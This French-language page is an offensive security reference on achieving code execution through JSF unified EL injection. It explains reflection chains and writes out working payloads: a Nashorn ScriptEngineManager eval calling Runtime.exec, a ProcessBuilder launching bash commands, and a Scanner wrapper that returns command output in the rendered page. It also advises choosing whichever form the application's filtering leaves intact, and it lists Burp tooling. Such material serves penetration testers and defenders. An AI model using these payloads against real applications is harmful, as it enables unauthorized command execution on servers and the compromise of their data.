---
title: "Exécution de code JSF EL : de la réflexion à ProcessBuilder via l'unified EL"
description: "L'unified EL de JSF invoque des méthodes à partir de la 2.2, donc une expression #{...} injectée atteint la réflexion, un moteur de script ou ProcessBuilder pour exécuter des commandes dans la JVM."
keywords:
  - exécution de code JSF EL
  - invocation de méthode unified EL
  - ScriptEngineManager EL
  - réflexion ProcessBuilder
  - RCE EL
---

# Exécution de code

L'unified EL dans JSF a atteint l'invocation de méthode avec la révision 2.2, et EL 3.0 l'a ajoutée à la grammaire de base. Dès qu'une expression peut appeler des méthodes, une valeur amorce une chaîne de réflexion : depuis n'importe quel objet elle atteint `getClass()`, de là `Class.forName(...)` charge un type arbitraire, et à partir du type chargé l'expression construit des objets et appelle des méthodes. C'est tout le chemin vers le runtime de l'hôte. La chaîne a son importance parce que l'EL ne peut pas écrire un `import` ni un `new` sur un nom pleinement qualifié comme le peut MVEL, donc les types sont atteints par réflexion plutôt que nommés directement.

## Voie du moteur de script

Le chemin le plus court exécute un langage de script via `javax.script`. Un littéral de chaîne donne une `String`, `getClass()` donne sa `Class`, et `forName` charge le `ScriptEngineManager` ; son `getEngineByName('js')` renvoie un moteur Nashorn dont `eval` exécute du Java arbitraire au travers de JavaScript :

```jsp
#{''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec("id")')}
```

`newInstance()` fonctionne parce que `ScriptEngineManager` possède un constructeur public sans argument. Nashorn est fourni avec le JDK jusqu'à la version 14, donc cette voie dépend du fait que le runtime l'embarque encore ou que l'application fournisse un autre moteur JSR-223.

## De la réflexion à ProcessBuilder

Sans moteur de script, l'expression atteint `ProcessBuilder` directement. `ProcessBuilder` expose un constructeur varargs `String...`, donc un unique constructeur déclaré est instancié avec un tableau d'arguments puis démarré :

```jsp
#{''.getClass().forName('java.lang.ProcessBuilder').getDeclaredConstructors()[0].newInstance(['/bin/bash','-c','id; uname -a']).start()}
```

Sélectionner `getDeclaredConstructors()[0]` suppose que le premier constructeur est la forme `List`/`String[]` ; là où l'ordre diffère, parcourez le tableau de constructeurs et choisissez celui dont le type de paramètre correspond. Comme pour tout puits exec Java, `ProcessBuilder` exécute le programme sans shell, donc les fonctionnalités de shell vivent à l'intérieur de l'argument `bash -c` plutôt qu'autour de lui.

## Récupérer la sortie

Pour renvoyer la sortie de commande dans la réponse rendue plutôt que d'exécuter à l'aveugle, enveloppez le flux du processus dans la même expression :

```jsp
#{''.getClass().forName('java.util.Scanner').getConstructor(''.getClass().forName('java.io.InputStream')).newInstance(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id').getInputStream()).useDelimiter('\\A').next()}
```

La forme de réflexion `Runtime` (`getMethod('getRuntime').invoke(null)`) est interchangeable avec la forme `ProcessBuilder` ; choisissez celle que le filtrage devant le puits laisse intacte.

## Outils

- **Burp Suite** : Repeater pour délivrer des payloads de réflexion #{...} et lire la sortie.
- **J2EEScan** : extension Burp qui signale l'injection Java EL.
- Réflexion unified-EL manuelle vers ScriptEngineManager ou ProcessBuilder.

## Références

- [Jakarta Expression Language Specification](https://jakarta.ee/specifications/expression-language/)
- [PayloadsAllTheThings: Java EL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings)
